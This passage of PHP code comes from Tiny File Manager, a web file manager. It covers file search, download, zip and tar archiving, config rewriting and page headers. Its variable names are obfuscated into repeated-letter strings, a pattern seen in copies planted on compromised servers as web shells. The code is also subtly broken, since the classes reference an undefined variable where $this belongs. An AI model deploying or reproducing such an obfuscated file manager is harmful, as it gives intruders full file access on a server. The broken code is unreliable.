fm_get_file_mimes($iiiiiiiiii){$jjjjjjjjjj['swf']='application/x-shockwave-flash';$jjjjjjjjjj['pdf']='application/pdf';$jjjjjjjjjj['exe']='application/octet-stream';$jjjjjjjjjj['zip']='application/zip';$jjjjjjjjjj['doc']='application/msword';$jjjjjjjjjj['xls']='application/vnd.ms-excel';$jjjjjjjjjj['ppt']='application/vnd.ms-powerpoint';$jjjjjjjjjj['gif']='image/gif';$jjjjjjjjjj['png']='image/png';$jjjjjjjjjj['jpeg']='image/jpg';$jjjjjjjjjj['jpg']='image/jpg';$jjjjjjjjjj['webp']='image/webp';$jjjjjjjjjj['avif']='image/avif';$jjjjjjjjjj['rar']='application/rar';$jjjjjjjjjj['ra']='audio/x-pn-realaudio';$jjjjjjjjjj['ram']='audio/x-pn-realaudio';$jjjjjjjjjj['ogg']='audio/x-pn-realaudio';$jjjjjjjjjj['wav']='video/x-msvideo';$jjjjjjjjjj['wmv']='video/x-msvideo';$jjjjjjjjjj['avi']='video/x-msvideo';$jjjjjjjjjj['asf']='video/x-msvideo';$jjjjjjjjjj['divx']='video/x-msvideo';$jjjjjjjjjj['mp3']='audio/mpeg';$jjjjjjjjjj['mp4']='audio/mpeg';$jjjjjjjjjj['mpeg']='video/mpeg';$jjjjjjjjjj['mpg']='video/mpeg';$jjjjjjjjjj['mpe']='video/mpeg';$jjjjjjjjjj['mov']='video/quicktime';$jjjjjjjjjj['swf']='video/quicktime';$jjjjjjjjjj['3gp']='video/quicktime';$jjjjjjjjjj['m4a']='video/quicktime';$jjjjjjjjjj['aac']='video/quicktime';$jjjjjjjjjj['m3u']='video/quicktime';$jjjjjjjjjj['php']=['application/x-php'];$jjjjjjjjjj['html']=['text/html'];$jjjjjjjjjj['txt']=['text/plain'];if(empty($jjjjjjjjjj[$iiiiiiiiii])){$jjjjjjjjjj[$iiiiiiiiii]=['application/octet-stream'];}return $jjjjjjjjjj[$iiiiiiiiii];}function scan($ggg='',$kkkkkkkkkk=''){$iii=FM_ROOT_PATH.'/'.$ggg;if($iii){$llllllllll=new RecursiveIteratorIterator(new RecursiveDirectoryIterator($iii));$mmmmmmmmmm=new RegexIterator($llllllllll,"/(".$kkkkkkkkkk.")/i");$lllll=array();foreach($mmmmmmmmmm as $ww){if(!$ww->isDir()){$ooo=$ww->getFilename();$nnnnnnnnnn=str_replace(FM_ROOT_PATH,'',$ww->getPath());$lllll[]=array("name"=>$ooo,"type"=>"file","path"=>$nnnnnnnnnn,);}}return $lllll;}}function fm_download_file($oooooooooo,$ooo,$pppppppppp=1024){if(connection_status()!=0)return(false);$iiiiiiiiii=pathinfo($ooo,PATHINFO_EXTENSION);$qqqqqqqqqq=fm_get_file_mimes($iiiiiiiiii);if(is_array($qqqqqqqqqq)){$qqqqqqqqqq=implode(' ',$qqqqqqqqqq);}$rrrrrrrrr=filesize($oooooooooo);if($rrrrrrrrr==0){fm_set_msg(lng('Zero byte file! Aborting download'),'error');$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));return(false);}@ini_set('magic_quotes_runtime',0);$pppp=fopen("$oooooooooo","rb");if($pppp===false){fm_set_msg(lng('Cannot open file! Aborting download'),'error');$jjj=FM_PATH;fm_redirect(FM_SELF_URL.'?p='.urlencode($jjj));return(false);}header('Content-Description: File Transfer');header('Expires: 0');header('Cache-Control: must-revalidate, post-check=0, pre-check=0');header('Pragma: public');header("Content-Transfer-Encoding: binary");header("Content-Type: $qqqqqqqqqq");$rrrrrrrrrr='attachment';if(strstr($_SERVER['HTTP_USER_AGENT'],"MSIE")){$ooo=preg_replace('/\./','%2e',$ooo,substr_count($ooo,'.')-1);header("Content-Disposition: $rrrrrrrrrr;filename=\"$ooo\"");}else{header("Content-Disposition: $rrrrrrrrrr;filename=\"$ooo\"");}header("Accept-Ranges: bytes");$ssssssssss=0;if(isset($_SERVER['HTTP_RANGE'])){list($tttttttttt,$ssssssssss)=explode("=",$_SERVER['HTTP_RANGE']);str_replace($ssssssssss,"-",$ssssssssss);$uuuuuuuuuu=$rrrrrrrrr-1;$vvvvvvvvvv=$rrrrrrrrr-$ssssssssss;header("HTTP/1.1 206 Partial Content");header("Content-Length: $vvvvvvvvvv");header("Content-Range: bytes $ssssssssss$uuuuuuuuuu/$rrrrrrrrr");}else{$uuuuuuuuuu=$rrrrrrrrr-1;header("Content-Range: bytes 0-$uuuuuuuuuu/$rrrrrrrrr");header("Content-Length: ".$rrrrrrrrr);}$oooooooooo=realpath($oooooooooo);while(ob_get_level())ob_end_clean();readfile($oooooooooo);fclose($pppp);return((connection_status()==0)and!connection_aborted());}function fm_get_theme(){$wwwwwwwwww='';if(FM_THEME=="dark"){$wwwwwwwwww="text-white bg-dark";}return $wwwwwwwwww;}class FM_Zipper{private $xxxxxxxxxx;public function __construct(){$yyyyyyyyyy->zip=new ZipArchive();}public function create($vvvvv,$lllll){$aaaa=$yyyyyyyyyy->zip->open($vvvvv,ZipArchive::CREATE);if($aaaa!==true){return false;}if(is_array($lllll)){foreach($lllll as $mmmmm){$mmmmm=fm_clean_path($mmmmm);if(!$yyyyyyyyyy->addFileOrDir($mmmmm)){$yyyyyyyyyy->zip->close();return false;}}$yyyyyyyyyy->zip->close();return true;}else{if($yyyyyyyyyy->addFileOrDir($lllll)){$yyyyyyyyyy->zip->close();return true;}return false;}}public function unzip($vvvvv,$iii){$aaaa=$yyyyyyyyyy->zip->open($vvvvv);if($aaaa!==true){return false;}if($yyyyyyyyyy->zip->extractTo($iii)){$yyyyyyyyyy->zip->close();return true;}return false;}private function addFileOrDir($vvvvv){if(is_file($vvvvv)){return $yyyyyyyyyy->zip->addFile($vvvvv);}elseif(is_dir($vvvvv)){return $yyyyyyyyyy->addDir($vvvvv);}return false;}private function addDir($iii){if(!$yyyyyyyyyy->zip->addEmptyDir($iii)){return false;}$rrrrrr=scandir($iii);if(is_array($rrrrrr)){foreach($rrrrrr as $ww){if($ww!='.'&&$ww!='..'){if(is_dir($iii.'/'.$ww)){if(!$yyyyyyyyyy->addDir($iii.'/'.$ww)){return false;}}elseif(is_file($iii.'/'.$ww)){if(!$yyyyyyyyyy->zip->addFile($iii.'/'.$ww)){return false;}}}}return true;}return false;}}class FM_Zipper_Tar{private $jjjjjj;public function __construct(){$yyyyyyyyyy->tar=null;}public function create($vvvvv,$lllll){$yyyyyyyyyy->tar=new PharData($vvvvv);if(is_array($lllll)){foreach($lllll as $mmmmm){$mmmmm=fm_clean_path($mmmmm);if(!$yyyyyyyyyy->addFileOrDir($mmmmm)){return false;}}return true;}else{if($yyyyyyyyyy->addFileOrDir($lllll)){return true;}return false;}}public function unzip($vvvvv,$iii){$aaaa=$yyyyyyyyyy->tar->open($vvvvv);if($aaaa!==true){return false;}if($yyyyyyyyyy->tar->extractTo($iii)){return true;}return false;}private function addFileOrDir($vvvvv){if(is_file($vvvvv)){try{$yyyyyyyyyy->tar->addFile($vvvvv);return true;}catch(Exception $uuu){return false;}}elseif(is_dir($vvvvv)){return $yyyyyyyyyy->addDir($vvvvv);}return false;}private function addDir($iii){$rrrrrr=scandir($iii);if(is_array($rrrrrr)){foreach($rrrrrr as $ww){if($ww!='.'&&$ww!='..'){if(is_dir($iii.'/'.$ww)){if(!$yyyyyyyyyy->addDir($iii.'/'.$ww)){return false;}}elseif(is_file($iii.'/'.$ww)){try{$yyyyyyyyyy->tar->addFile($iii.'/'.$ww);}catch(Exception $uuu){return false;}}}}return true;}return false;}}class FM_Config{var $zzzzzzzzzz;function __construct(){global $r,$s,$b;$aaaaaaaaaaa=$s.$_SERVER["PHP_SELF"];$yyyyyyyyyy->data=array('lang'=>'en','error_reporting'=>true,'show_hidden'=>true);$zzzzzzzzzz=false;if(strlen($b)){$zzzzzzzzzz=fm_object_to_array(json_decode($b));}else{$vv='Tiny File Manager<br>Error: Cannot load configuration';if(substr($aaaaaaaaaaa,-1)=='/'){$aaaaaaaaaaa=rtrim($aaaaaaaaaaa,'/');$vv.='<br>';$vv.='<br>Seems like you have a trailing slash on the URL.';$vv.='<br>Try this link: <a href="'.$aaaaaaaaaaa.'">'.$aaaaaaaaaaa.'</a>';}die($vv);}if(is_array($zzzzzzzzzz)&&count($zzzzzzzzzz))$yyyyyyyyyy->data=$zzzzzzzzzz;else $yyyyyyyyyy->save();}function save(){$bbbbbbbbbbb=__FILE__;$ccccccccccc='$CONFIG';$ddddddddddd=var_export(json_encode($yyyyyyyyyy->data),true);$eeeeeeeeeee="<?php".chr(13).chr(10)."//Default Configuration".chr(13).chr(10)."$ccccccccccc = $ddddddddddd;".chr(13).chr(10);if(is_writable($bbbbbbbbbbb)){$fffffffffff=file($bbbbbbbbbbb);if($ggggggggggg=@fopen($bbbbbbbbbbb,"w")){@fputs($ggggggggggg,$eeeeeeeeeee,strlen($eeeeeeeeeee));for($vvvvvv=3;$vvvvvv<count($fffffffffff);$vvvvvv++){@fputs($ggggggggggg,$fffffffffff[$vvvvvv],strlen($fffffffffff[$vvvvvv]));}@fclose($ggggggggggg);}}}}function fm_show_nav_path($iii){global $oo,$dd,$yyyyyyy;$hhhhhhhhhhh=$dd?'fixed-top':'';$iiiiiiiiiii=fm_get_theme();$iiiiiiiiiii.=" navbar-light";if(FM_THEME=="dark"){$iiiiiiiiiii.=" navbar-dark";}else{$iiiiiiiiiii.=" bg-white";}?>
    <nav class="navbar navbar-expand-lg <?php echo $iiiiiiiiiii;?> mb-4 main-nav <?php echo $hhhhhhhhhhh?>">
        <a class="navbar-brand"> <?php echo lng('AppTitle')?> </a>
        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="navbarSupportedContent">

            <?php
 $iii=fm_clean_path($iii);$s="<a href='?p='><i class='fa fa-home' aria-hidden='true' title='".FM_ROOT_PATH."'></i></a>";$jjjjjjjjjjj='<i class="bread-crumb"> / </i>';if($iii!=''){$kkkkkkkkkkk=explode('/',$iii);$lllllllllll=count($kkkkkkkkkkk);$hhhhhhhhh=array();$qqqqqq='';for($mmmmmmmmmmm=0;$mmmmmmmmmmm<$lllllllllll;$mmmmmmmmmmm++){$qqqqqq=trim($qqqqqq.'/'.$kkkkkkkkkkk[$mmmmmmmmmmm],'/');$nnnnnnnnnnn=urlencode($qqqqqq);$hhhhhhhhh[]="<a href='?p={$nnnnnnnnnnn}'>".fm_enc(fm_convert_win($kkkkkkkkkkk[$mmmmmmmmmmm]))."</a>";}$s.=$jjjjjjjjjjj.implode($jjjjjjjjjjj,$hhhhhhhhh);}echo '<div class="col-xs-6 col-sm-5">'.$s.$yyyyyyy.'</div>';?>

            <div class="col-xs-6 col-sm-7">
                <ul class="navbar-nav justify-content-end <?php echo fm_get_theme();?>">
                    <li class="nav-item mr-2">
                        <div class="input-group input-group-sm mr-1" style="margin-top:4px;">
                            <input type="text" class="form-control" placeholder="<?php echo lng('Filter')?>" aria-label="<?php echo lng('Search')?>" aria-describedby="search-addon2" id="search-addon">
                            <div class="input-group-append">
                                <span class="input-group-text brl-0 brr-0" id="search-addon2"><i class="fa fa-search"></i></span>
                            </div>
                            <div class="input-group-append btn-group">
                                <span class="input-group-text dropdown-toggle brl-0" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></span>
                                  <div class="dropdown-menu dropdown-menu-right">
                                    <a class="dropdown-item" href="<?php echo $ooooooooooo=$iii?$iii:'.';?>" id="js-search-modal" data-bs-toggle="modal" data-bs-target="#searchModal"><?php echo lng('Advanced Search')?></a>
                                  </div>
                            </div>
                        </div>
                    </li>
                    <?php if(!FM_READONLY):?>
                    <li class="nav-item">
                        <a title="<?php echo lng('Upload')?>" class="nav-link" href="?p=<?php echo urlencode(FM_PATH)?>&amp;upload"><i class="fa fa-cloud-upload" aria-hidden="true"></i> <?php echo lng('Upload')?></a>
                    </li>
                    <li class="nav-item">
                        <a title="<?php echo lng('NewItem')?>" class="nav-link" href="#createNewItem" data-bs-toggle="modal" data-bs-target="#createNewItem"><i class="fa fa-plus-square"></i> <?php echo lng('NewItem')?></a>
                    </li>
                    <?php endif;?>
                    <?php if(FM_USE_AUTH):?>
                    <li class="nav-item avatar dropdown">
                        <a class="nav-link dropdown-toggle" id="navbarDropdownMenuLink-5" data-bs-toggle="dropdown" aria-haspopup="true" aria-expanded="false"> <i class="fa fa-user-circle"></i> <?php if(isset($_SESSION[FM_SESSION_ID]['logged'])){echo $_SESSION[FM_SESSION_ID]['logged'];}?></a>
                        <div class="dropdown-menu text-small shadow <?php echo fm_get_theme();?>" aria-labelledby="navbarDropdownMenuLink-5">
                            <?php if(!FM_READONLY):?>
                            <a title="<?php echo lng('Settings')?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH)?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php echo lng('Settings')?></a>
                            <?php endif?>
                            <a title="<?php echo lng('Help')?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH)?>&amp;help=2"><i class="fa fa-exclamation-circle" aria-hidden="true"></i> <?php echo lng('Help')?></a>
                            <a title="<?php echo lng('Logout')?>" class="dropdown-item nav-link" href="?logout=1"><i class="fa fa-sign-out" aria-hidden="true"></i> <?php echo lng('Logout')?></a>
                        </div>
                    </li>
                    <?php else:?>
                        <?php if(!FM_READONLY):?>
                            <li class="nav-item">
                                <a title="<?php echo lng('Settings')?>" class="dropdown-item nav-link" href="?p=<?php echo urlencode(FM_PATH)?>&amp;settings=1"><i class="fa fa-cog" aria-hidden="true"></i> <?php echo lng('Settings')?></a>
                            </li>
                        <?php endif;?>
                    <?php endif;?>
                </ul>
            </div>
        </div>
    </nav>
    <?php
}function fm_show_message(){if(isset($_SESSION[FM_SESSION_ID]['message'])){$ppppppppppp=isset($_SESSION[FM_SESSION_ID]['status'])?$_SESSION[FM_SESSION_ID]['status']:'ok';echo '<p class="message '.$ppppppppppp.'">'.$_SESSION[FM_SESSION_ID]['message'].'</p>';unset($_SESSION[FM_SESSION_ID]['message']);unset($_SESSION[FM_SESSION_ID]['status']);}}function fm_show_header_login(){$qqqqqqqqqqq='20160315';header("Content-Type: text/html; charset=utf-8");header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");header("Pragma: no-cache");global $oo,$s,$aa;?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
    <meta name="author" content="CCP Programmers">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php if($aa){echo '<link rel="icon" href="'.fm_enc($aa).'" type="image/png">';}?>
    <title><?php echo fm_enc(APP_TITLE)?></title>
    <?php print_external('pre-jsdelivr');?>
    <?php print_external('css-bootstrap');?>
    <style>
        body.fm-login-page{ background-color:#f7f9fb;font-size:14px;background-color:#f7f9fb;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 304 304' width='304' height='304'%3E%3Cpath fill='%23e2e9f1' fill-opacity='0.4' d='M44.1 224a5 5 0 1 1 0 2H0v-2h44.1zm160 48a5 5 0 1 1 0 2H82v-2h122.1zm57.8-46a5 5 0 1 1 0-2H304v2h-42.1zm0 16a5 5 0 1 1 0-2H304v2h-42.1zm6.2-114a5 5 0 1 1 0 2h-86.2a5 5 0 1 1 0-2h86.2zm-256-48a5 5 0 1 1 0 2H0v-2h12.1zm185.8 34a5 5 0 1 1 0-2h86.2a5 5 0 1 1 0 2h-86.2zM258 12.1a5 5 0 1 1-2 0V0h2v12.1zm-64 208a5 5 0 1 1-2 0v-54.2a5 5 0 1 1 2 0v54.2zm48-198.2V80h62v2h-64V21.9a5 5 0 1 1 2 0zm16 16V64h46v2h-48V37.9a5 5 0 1 1 2 0zm-128 96V208h16v12.1a5 5 0 1 1-2 0V210h-16v-76.1a5 5 0 1 1 2 0zm-5.9-21.9a5 5 0 1 1 0 2H114v48H85.9a5 5 0 1 1 0-2H112v-48h12.1zm-6.2 130a5 5 0 1 1 0-2H176v-74.1a5 5 0 1 1 2 0V242h-60.1zm-16-64a5 5 0 1 1 0-2H114v48h10.1a5 5 0 1 1 0 2H112v-48h-10.1zM66 284.1a5 5 0 1 1-2 0V274H50v30h-2v-32h18v12.1zM236.1 176a5 5 0 1 1 0 2H226v94h48v32h-2v-30h-48v-98h12.1zm25.8-30a5 5 0 1 1 0-2H274v44.1a5 5 0 1 1-2 0V146h-10.1zm-64 96a5 5 0 1 1 0-2H208v-80h16v-14h-42.1a5 5 0 1 1 0-2H226v18h-16v80h-12.1zm86.2-210a5 5 0 1 1 0 2H272V0h2v32h10.1zM98 101.9V146H53.9a5 5 0 1 1 0-2H96v-42.1a5 5 0 1 1 2 0zM53.9 34a5 5 0 1 1 0-2H80V0h2v34H53.9zm60.1 3.9V66H82v64H69.9a5 5 0 1 1 0-2H80V64h32V37.9a5 5 0 1 1 2 0zM101.9 82a5 5 0 1 1 0-2H128V37.9a5 5 0 1 1 2 0V82h-28.1zm16-64a5 5 0 1 1 0-2H146v44.1a5 5 0 1 1-2 0V18h-26.1zm102.2 270a5 5 0 1 1 0 2H98v14h-2v-16h124.1zM242 149.9V160h16v34h-16v62h48v48h-2v-46h-48v-66h16v-30h-16v-12.1a5 5 0 1 1 2 0zM53.9 18a5 5 0 1 1 0-2H64V2H48V0h18v18H53.9zm112 32a5 5 0 1 1 0-2H192V0h50v2h-48v48h-28.1zm-48-48a5 5 0 0 1-9.8-2h2.07a3 3 0 1 0 5.66 0H178v34h-18V21.9a5 5 0 1 1 2 0V32h14V2h-58.1zm0 96a5 5 0 1 1 0-2H137l32-32h39V21.9a5 5 0 1 1 2 0V66h-40.17l-32 32H117.9zm28.1 90.1a5 5 0 1 1-2 0v-76.51L175.59 80H224V21.9a5 5 0 1 1 2 0V82h-49.59L146 112.41v75.69zm16 32a5 5 0 1 1-2 0v-99.51L184.59 96H300.1a5 5 0 0 1 3.9-3.9v2.07a3 3 0 0 0 0 5.66v2.07a5 5 0 0 1-3.9-3.9H185.41L162 121.41v98.69zm-144-64a5 5 0 1 1-2 0v-3.51l48-48V48h32V0h2v50H66v55.41l-48 48v2.69zM50 53.9v43.51l-48 48V208h26.1a5 5 0 1 1 0 2H0v-65.41l48-48V53.9a5 5 0 1 1 2 0zm-16 16V89.41l-34 34v-2.82l32-32V69.9a5 5 0 1 1 2 0zM12.1 32a5 5 0 1 1 0 2H9.41L0 43.41V40.6L8.59 32h3.51zm265.8 18a5 5 0 1 1 0-2h18.69l7.41-7.41v2.82L297.41 50H277.9zm-16 160a5 5 0 1 1 0-2H288v-71.41l16-16v2.82l-14 14V210h-28.1zm-208 32a5 5 0 1 1 0-2H64v-22.59L40.59 194H21.9a5 5 0 1 1 0-2H41.41L66 216.59V242H53.9zm150.2 14a5 5 0 1 1 0 2H96v-56.6L56.6 162H37.9a5 5 0 1 1 0-2h19.5L98 200.6V256h106.1zm-150.2 2a5 5 0 1 1 0-2H80v-46.59L48.59 178H21.9a5 5 0 1 1 0-2H49.41L82 208.59V258H53.9zM34 39.8v1.61L9.41 66H0v-2h8.59L32 40.59V0h2v39.8zM2 300.1a5 5 0 0 1 3.9 3.9H3.83A3 3 0 0 0 0 302.17V256h18v48h-2v-46H2v42.1zM34 241v63h-2v-62H0v-2h34v1zM17 18H0v-2h16V0h2v18h-1zm273-2h14v2h-16V0h2v16zm-32 273v15h-2v-14h-14v14h-2v-16h18v1zM0 92.1A5.02 5.02 0 0 1 6 97a5 5 0 0 1-6 4.9v-2.07a3 3 0 1 0 0-5.66V92.1zM80 272h2v32h-2v-32zm37.9 32h-2.07a3 3 0 0 0-5.66 0h-2.07a5 5 0 0 1 9.8 0zM5.9 0A5.02 5.02 0 0 1 0 5.9V3.83A3 3 0 0 0 3.83 0H5.9zm294.2 0h2.07A3 3 0 0 0 304 3.83V5.9a5 5 0 0 1-3.9-5.9zm3.9 300.1v2.07a3 3 0 0 0-1.83 1.83h-2.07a5 5 0 0 1 3.9-3.9zM97 100a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-48 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 96a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-144a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm96 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM49 36a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-32 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM33 68a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 240a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm80-176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 48a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm112 176a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm-16 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 180a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0 16a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm0-32a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16 0a3 3 0 1 0 0-6 3 3 0 0 0 0 6zM17 84a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm32 64a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm16-16a3 3 0 1 0 0-6 3 3 0 0 0 0 6z'%3E%3C/path%3E%3C/svg%3E");}
        .fm-login-page .brand{ width:121px;overflow:hidden;margin:0 auto;position:relative;z-index:1}
        .fm-login-page .brand img{ width:100%}
        .fm-login-page .card-wrapper{ width:360px;margin-top:10%;margin-left:auto;margin-right:auto;}
        .fm-login-page .card{ border-color:transparent;box-shadow:0 4px 8px rgba(0,0,0,.05)}
        .fm-login-page .card-title{ margin-bottom:1.5rem;font-size:24px;font-weight:400;}
        .fm-login-page .form-control{ border-width:2.3px}
        .fm-login-page .form-group label{ width:100%}
        .fm-login-page .btn.btn-block{ padding:12px 10px}
        .fm-login-page .footer{ margin:40px 0;color:#888;text-align:center}
        @media screen and (max-width:425px){
            .fm-login-page .card-wrapper{ width:90%;margin:0 auto;margin-top:10%;}
        }
        @media screen and (max-width:320px){
            .fm-login-page .card.fat{ padding:0}
            .fm-login-page .card.fat .card-body{ padding:15px}
        }
        .message{ padding:4px 7px;border:1px solid #ddd;background-color:#fff}
        .message.ok{ border-color:green;color:green}
        .message.error{ border-color:red;color:red}
        .message.alert{ border-color:orange;color:orange}
        body.fm-login-page.theme-dark {background-color: #2f2a2a;}
        .theme-dark svg g, .theme-dark svg path {fill: #ffffff; }
    </style>
</head>
<body class="fm-login-page <?php echo(FM_THEME=="dark")?'theme-dark':'';?>">
<div id="wrapper" class="container-fluid">

    <?php
}function fm_show_footer_login(){?>
</div>
<?php print_external('js-jquery');?>
<?php print_external('js-bootstrap');?>
</body>
</html>
<?php
}function fm_show_header(){$qqqqqqqqqqq='20160315';header("Content-Type: text/html; charset=utf-8");header("Expires: Sat, 26 Jul 1997 05:00:00 GMT");header("Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0");header("Pragma: no-cache");global $oo,$s,$dd,$aa;$hhhhhhhhhhh=$dd?'navbar-fixed':'navbar-normal';?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Web based File Manager in PHP, Manage your files efficiently and easily with Tiny File Manager">
    <meta name="author" content="CCP Programmers">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <?php if($aa){echo '<link rel="icon" href="'.fm_enc($aa).'" type="image/png">';}?>
    <title><?php echo fm_enc(APP_TITLE)?></title>
    <?php print_external('pre-jsdelivr');?>
    <?php print_external('pre-cloudflare');?>
    <?php print_external('css-bootstrap');?>
    <?php print_external('css-font-awesome');?>
    <?php if(FM_USE_HIGHLIGHTJS&&isset($_GET['view'])):?>
    <?php print_external('css-highlightjs');?>
    <?php endif;?>
    <script type="text/javascript">window.csrf = '<?php echo $_SESSION['token'];?>';</script>
    <style>
        html { -moz-osx-font-smoothing: grayscale; -webkit-font-smoothing: antialiased; text-rendering: optimizeLegibility; height: 100%; scroll-behavior: smooth;}
        *,*::before,*::after { box-sizing: border-box;}
        body { font-size:15px; color:#222;background:#F7F7F7; }
        body.navbar-fixed { margin-top:55px; }
        a, a:hover, a:visited, a:focus { text-decoration:none !important; }
        .filename, td, th { white-space:nowrap  }
        .navbar-brand { font-weight:bold; }
        .nav-item.avatar a { cursor:pointer;text-transform:capitalize; }
        .nav-item.avatar a > i { font-size:15px; }
        .nav-item.avatar .dropdown-menu a { font-size:13px; }
        #search-addon { font-size:12px;border-right-width:0; }
        .brl-0 { background:transparent;border-left:0; border-top-left-radius: 0; border-bottom-left-radius: 0; }
        .brr-0 { border-top-right-radius: 0; border-bottom-right-radius: 0; }
        .bread-crumb { color:#cccccc;font-style:normal; }
        #main-table { transition: transform .25s cubic-bezier(0.4, 0.5, 0, 1),width 0s .25s;}
        #main-table .filename a { color:#222222; }
        .table td, .table th { vertical-align:middle !important; }
        .table .custom-checkbox-td .custom-control.custom-checkbox, .table .custom-checkbox-header .custom-control.custom-checkbox { min-width:18px; display: flex;align-items: center; justify-content: center; }
        .table-sm td, .table-sm th { padding:.4rem; }
        .table-bordered td, .table-bordered th { border:1px solid #f1f1f1; }
        .hidden { display:none  }
        pre.with-hljs { padding:0; overflow: hidden;  }
        pre.with-hljs code { margin:0;border:0;overflow:scroll;  }
        code.maxheight, pre.maxheight { max-height:512px  }
        .fa.fa-caret-right { font-size:1.2em;margin:0 4px;vertical-align:middle;color:#ececec  }
        .fa.fa-home { font-size:1.3em;vertical-align:bottom  }
        .path { margin-bottom:10px  }
        form.dropzone { min-height:200px;border:2px dashed #007bff;line-height:6rem; }
        .right { text-align:right  }
        .center, .close, .login-form, .preview-img-container { text-align:center  }
        .message { padding:4px 7px;border:1px solid #ddd;background-color:#fff  }
        .message.ok { border-color:green;color:green  }
        .message.error { border-color:red;color:red  }
        .message.alert { border-color:orange;color:orange  }
        .preview-img { max-width:100%;max-height:80vh;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC) }
        .inline-actions > a > i { font-size:1em;margin-left:5px;background:#3785c1;color:#fff;padding:3px 4px;border-radius:3px; }
        .preview-video { position:relative;max-width:100%;height:0;padding-bottom:62.5%;margin-bottom:10px  }
        .preview-video video { position:absolute;width:100%;height:100%;left:0;top:0;background:#000  }
        .compact-table { border:0;width:auto  }
